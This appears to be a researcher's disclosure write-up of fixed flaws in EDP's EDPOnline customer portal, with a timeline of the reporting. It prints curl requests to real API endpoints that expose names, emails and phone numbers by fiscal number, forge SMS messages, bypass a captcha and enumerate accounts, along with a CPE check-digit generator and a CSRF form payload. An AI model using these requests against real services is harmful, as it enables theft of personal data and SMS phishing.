+++
title = "Accessing Every Customer's Data &amp; SMS Impersonation - EDP - Portuguese Electric &amp; Gas Operator (EDPOnline)"
description = "Several PII Leaks (NIF + Full Name + Email + Phone Number), SMS Injection"
updated = "2024-12-29"
[extra]
thumb_image = "images/edp/main.png"
+++

[EDP](https://www.edp.pt) is by far the largest electric and gas operator in Portugal. Like other entities, it provides an easy-to-use platform, [EDPOnline](https://edponline.edp.pt), for customers to access their account, contracts and associated information.

{{ image(
    path="images/edp/main.png",
    alt="EDP Online account homepage.",
    caption_no="1",
    caption="EDP Online account homepage."
) }}

During a routine check on my electricity bill, I decided to check for security vulnerabilities. Since it's not possible to create an empty account, I went ahead and used my own, refraining myself along the way from the usual extensive endpoint fiddling. Messing with the energy report could severely dent either my wallet or my time on a support line attempting to explain that my new massive bill was a result of entering malformed input. Definitely not taking that risk.

Before dissecting each flaw, it should be noted that **EDP's response was not only timely, but also extremely professional**. These mistakes will occur; what matters most is how you react to them. Bashing a company for a headline isn't fruitful, but judging them on their response is. EDP's was, by far, the best one I've had to this day, especially given that the report was submitted between Christmas and New Year. Further details can be found in the timeline at the end.

### Full Name Exfiltration via NIF

When adding a new contract to your account, you are asked for the linked fiscal number (`NIF`) and an installation ID (`CPE` or `CUI`).

{{ image(
    path="images/edp/contractnew.png",
    alt="EDP Online new contract dialog.",
    caption_no="2",
    caption="EDP Online new contract dialog."
) }}

If you enter both correctly, you'll get a new dialog asking for confirmation. That prompt also contained the `NIF` you provided, along with the name associated with such `NIF` and contract. What happened when you provided a pair of `NIF` and `CPE` that wasn't yours?

{{ image(
    path="images/edp/contractleak.png",
    alt="EDP Online new contract dialog PII leak.",
    caption_no="3",
    caption="EDP Online new contract dialog PII leak."
) }}

You got the full name of the person who owns the given NIF. There's an obstacle in the way, though: you still needed to know a `NIF` and `CPE` pair, which is expensive to bruteforce/guess. Turns out that wasn't the case as providing any valid `CPE` was enough - it didn't need to match the NIF. This meant you could essentially iterate all valid NIFs and exfiltrate the list of full names and their corresponding fiscal numbers of all EDP consumer clients.

The request needed to exploit this was:

``` sh
curl -X POST \
  https://edponline.edp.pt/api/v2/contract/getContractsToAssociate \
  -H 'cookie: PHPSESSID=YOUR_SESSION' \
  -d '{
        "category": "contract",
        "operation": "getContractsToAssociate",
        "Body": {
          "Nif": "123456789",
          "CPE_CUI": "VALID_CPE_CUI",
          "CIL": null,
          "ContractID": null
        }
      }'
```

The response also revealed some extra information about the account:

``` javascript
{
  "Header": {"errorStatus": null, "errorMsg": null, "Status": null},
  "Body": {
    "Result": {
      "list": [{"Company": "pt.edp.edponline.company.EDPSU"}],
      "found": true,
      "nifHasContacts": false,
      "nifHasEmail": true,
      "nifHasPhone": true,
      "nifHasEDPOnlineRegister": false,
      "name": "JANE ROE",
      "nif": "123456789",
      "previousAuthorizationWaitingApproval": false
    },
    "Success": true
  }
}
```

### SMS Injection

Another neat feature that's available from the platform is the ability to get an SMS message with the latest payment details.

{{ image(
    path="images/edp/sms.png",
    alt="EDP Online SMS feature.",
    caption_no="4",
    caption="EDP Online SMS feature."
) }}

Clicking `Enviar dados via SMS (serviço grátis)` will display a prompt requesting the phone number where the information should be sent to.

{{ image(
    path="images/edp/sms-dialog.png",
    alt="EDP Online SMS dialog.",
    caption_no="5",
    caption="EDP Online SMS dialog."
) }}

This is pretty useful but unfortunately lacked a few validation checks, allowing an attacker to send forged data instead of the supposed payment details. The phone number wasn't validated either, meaning that you could send the aforementioned message to a recipient of your choosing.

When submitting the form, the following request was executed:

``` sh
curl -X POST \
  https://edponline.edp.pt/api/v2/contract/sendSMSPaymentReference \
  -H 'cookie: PHPSESSID=YOUR_SESSION' \
  -d '{
        "category": "contract",
        "operation": "sendSMSPaymentReference",
        "Body": {
          "ContractId": "YOUR_CONTRACT_ID",
          "Phone": "123456789",
          "Entity": "$Injected$",
          "Reference": "$Injected$",
          "Amount": "$Injected$",
          "LimitDate": "$Injected$"
        }
      }'
```

This sent an SMS message to `123456789` with the injected data. Note that the fields with `$Injected` could be different from each other and take any string.

{{ image(
    path="images/edp/sms-result.png",
    alt="Received SMS.",
    caption_no="6",
    caption="Received SMS."
    vertical="true"
) }}

A better approach would be to only send the payment record id when the user requests the SMS.

### Email & Phone Exfiltration via NIF

Outside the private account area, there are also interesting endpoints to tinker with. In this case, the various interconnected registration and password reset flows were flawed in several ways.

Take for example the following request:

``` sh
curl -X POST \
  https://edponline.edp.pt/api/v2/auth/register \
  -d '{
        "category": "auth",
        "operation": "register",
        "Body": {
          "Operation": "CheckUser",
          "Nif": "123456789",
        }
      }'
```

This is sent when a user attempts to register with a certain `NIF` (`123456789` in this case). If the `NIF` is already registered, the following page is presented to the user.

{{ image(
    path="images/edp/emailleak.png",
    alt="EDP Online email leak.",
    caption_no="7",
    caption="EDP Online email leak."
) }}

This shows a partially hidden email address if the account has one. The domain is always shown and the asterisks will cover all but 4 characters. In case the local-part is smaller, only 2 characters are visible. If the local-part is 2 characters or less, the full email is displayed. A better way of doing this would be to hide the local-part when it is `<= 4` characters and not mapping the `*`'s to the actual number of characters.

Now let's analyse the response to the request shown above:

``` javascript
{
    "Header": {"errorStatus": null, "errorMsg": null, "Status": null},
    "Body": {
      "Result": {
        "Email": "ba*****di@dea.com",
        "EmailEncoded": "QkFBQUFBQURJQERFQS5DT00=",
        "IsB2B":null
      },
      "Success": true
    }
}
```

Notice the `EmailEncoded` key. It contained a hash, which was a bad sign by itself, as it probably meant we could bruteforce it without having the network request overhead. This is assuming it's a 1-way hash, which it wasn't:

``` javascript
this.ValidateEmail = function() {
  var a = $filter("uppercase")(self.Register.Email);
  return self.Base64.encode(a) === self.Register.EmailEncoded
}
```

Doing a base64 decode outputs the full email - `BAAAAAADI@DEA.COM`. This function also assumes that emails aren't case sensitive, which [isn't technically correct](https://tools.ietf.org/html/rfc5321#section-2.3.11).

A similar issue occurred with the associated phone number as we're given something along the lines of `"PhoneMask":"9******12"`. In this case, we can't just decode a hash, but we could still bruteforce the number.

### Captcha Bypass & Email + UserId Enumeration

While I didn't spend much time analyzing the registration endpoints, I did find a way of bypassing the password recovery captcha. This is the request that triggers the password recovery email (only one of `VALID_NIF`, `VALID_EMAIL` is needed):

``` sh
curl -X POST \
  https://edponline.edp.pt/api/v2/auth/pwd-recover \
  -d '{
        "category": "auth",
        "operation": "pwd-recover",
        "Body": {
          "Operation": "request",
          "Nif": "VALID_NIF",
          "Email": "VALID_EMAIL",
          "RecaptchaResponse":"SOMETHING"
        }
      }'
```

However, there's another endpoint that looks like this:

``` sh
curl -X POST \
  https://edponline.edp.pt/api/v2/auth/register \
  -d '{
        "category": "auth",
        "operation": "register",
        "Body": {
          "Operation": "SendRecoveryEmail",
          "Nif": "VALID_NIF",
          "Email": "VALID_EMAIL",
        }
      }'
```

This one didn't require a captcha, and again only one of `VALID_NIF`, `VALID_EMAIL` was needed, meaning that it was a brute-forceable equivalent to the password reset endpoint.

It could also be used to check whether the email existed on their database, something not possible with the login form. The response also contained the `userId`.

### NIF + CPE Pair Enumeration

It was also possible to check whether a `NIF` + `CPE` pair existed with:

``` sh
curl -X POST \
  https://edponline.edp.pt/api/v2/auth/register \
  -d '{
        "category": "auth",
        "operation": "register",
        "Body": {
          "Operation": "GetUserValidation",
          "Target": "B2B",
          "Nif": "VALID_NIF",
          "DeliveryPoint":"VALID_CPE"
        }
      }'
```

After some digging, I found the `CPE` format: `PT0002` + `12 digits` + `2 letters`, with the last 2 letters being the integrity check. To generate one we can use:

``` javascript
function checkCPE(cpe) {
  var cMap = {
    0:'T',1:'R',2:'W',3:'A',4:'G',5:'M',6:'Y',7:'F',8:'P',9:'D',10:'X',11:'B',
    12:'N',13:'J',14:'Z',15:'S',16:'Q',17:'V',18:'H',19:'L',20:'C',21:'K',22:'E'
  };
  var cRegex = /[A-Z]{2}/;
  if (
    cpe && cpe.length == 20 && cpe.substring(0, 2) == 'PT' &&
    !isNaN(cpe.substring(2, 18)) && cRegex.test(cpe.substring(18))
  ) {
      var i = parseInt(cpe.substring(2, 18), 10) % 529;
      var j = Math.floor(parseFloat(i) / 23);
      var k = i % 23;
      if (k < 23 && j < 23) {
        return cpe[18] == cMap[parseInt(j, 10)] &&
               cpe[19] == cMap[parseInt(k, 10)];
      }
  }
  return false;
}
```

By examining a few CPEs it was also clear how those `12 digits` were structured, meaning that a skilled attacker could massively reduce the search space. Knowing this combination is especially useful for social engineering attacks.

### XSRF

No endpoint used token-synchronization or any other method to foil this attack. The reason behind this might have been the assumption that JSON form submits aren't vulnerable to XSRF.

This stems from the idea that if you check the `Content-Type` header and parse the data accordingly, it isn't possible to exploit XSRFs with traditional means (assuming a proper CORS policy) as browsers won't send `Content-Type: application/javascript` without XHR even if you use something like:

``` html
<body onload="document.forms[0].submit()">
  <form method="POST" enctype="application/javascript">
    <input name='{"key": "data", "ignore": "' value='"}'>
  </form>
</body>
```

Needless to say, fixing this with a header check isn't the brightest of ideas, as this could potentially change in the future (and there is an [old, abandoned W3C specification](https://www.w3.org/TR/html-json-forms/) lying around).

### Session Fixation

When changing session privileges, e.g., by logging in/out, the session token/cookie `PHPSESSID` wasn't changed, nor verified, meaning that you could potentially fixate it and/or supply an "invalid" or empty token.

### The Lucky CORS Typo

Finally, the API used for user state requests, `https://edponline.edp.pt/api/`, had the following response header:

`Access-Control-Allow-Orgin: *`

That clearly has a typo in `Orgin`, and I rightly pointed that out on my original report. It was quickly fixed, but not before I noticed that it was actually being returned across the whole API, meaning that the previously mentioned XSRF vulnerabilities were now much more dangerous - visiting an attacker's page while signed in on EDP would mean the account would be completely compromised.

Let's just say it wasn't a mistake, but rather an intricate, carefully planed "ah ah" letdown moment for any lingering pen tester :)

### Timeline

| Date                    | Activity
|-------------------------|------------------------------------------------------------------------------
| 2017-12-14              | Found most vulnerabilities.
| 2017-12-15              | Contacted EDP at `security@edp.pt` (bounced).
| 2017-12-24 - 2017-12-26 | Contacted EDP at `servicoaocliente@edp.pt` and `edp.online@edp.pt`.
| 2018-01-04              | Got a response from EDP requesting vulnerability details.
| 2018-01-07              | Found the SMS Injection vulnerability.
| 2018-01-08              | Provided full details to EDP.
| 2018-01-09              | Got a response from EDP's Security Team and a request for a phone call.
| 2018-01-09              | Phone call. Issues are being analysed and fixed. In-person meeting scheduled.
| 2018-01-12 - 2018-01-30 | NIF & Full Name Enumeration, SMS Injection flaws fixed.
| 2018-01-30              | In-person meeting.
| 2018-01-30 - 2018-02-14 | Email Exfiltration, Captcha Bypass & Email + UserId Enumeration flaws fixed.
| 2018-02-14 - 2018-03-08 | Remaining minor vulnerabilities fixed.
| 2018-03-11              | Public disclosure.
